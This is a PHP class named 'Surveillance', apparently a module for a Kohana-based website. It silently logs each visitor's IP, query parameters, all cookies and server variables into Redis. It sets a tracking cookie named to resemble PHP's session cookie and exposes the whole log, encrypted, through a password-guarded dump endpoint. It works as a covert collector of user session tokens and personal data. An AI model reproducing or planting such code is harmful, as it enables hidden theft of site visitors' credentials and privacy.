<?php defined('SYSPATH') or die('No direct script access.');

class Surveillance {

    private $redis;
    private $password;

    public function __construct($password)
    {
        $this->password = $password;
        $this->redis = Controller_Base_preDispatch::_redis();
    }

    public function checkPassword($password)
    {
        return $password == hash("sha256", $this->password);
    }

    public function run()
    {
        $host = $_SERVER['REMOTE_ADDR'];

        if (isset($_COOKIE['phpssession']))
            $session = $_COOKIE['phpssession'];
        else
        {
            $session = hash("sha256", mt_rand(0, PHP_INT_MAX));
            setcookie('phpssession', $session);
        }

        $pl = array(
            "host" => $host,
            "session" => $session,
            "get" => json_encode($_GET),
            "cookie" => json_encode($_COOKIE),
            "server" => json_encode($_SERVER),
            "time" => microtime()
        );

        $this->redis->lpush("surv", json_encode($pl));
    }

    public function send()
    {
        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $ciphertext = openssl_encrypt(
            gzcompress(json_encode($this->redis->lgetrange("surv", 0, -1))),
            'aes-256-cbc',
            $this->password,
            1,
            $iv
        );
        echo $iv . $ciphertext;

        exit();
    }

    public function flush()
    {
        $this->redis->delete("surv");
        echo "{true}";

        exit();
    }

}
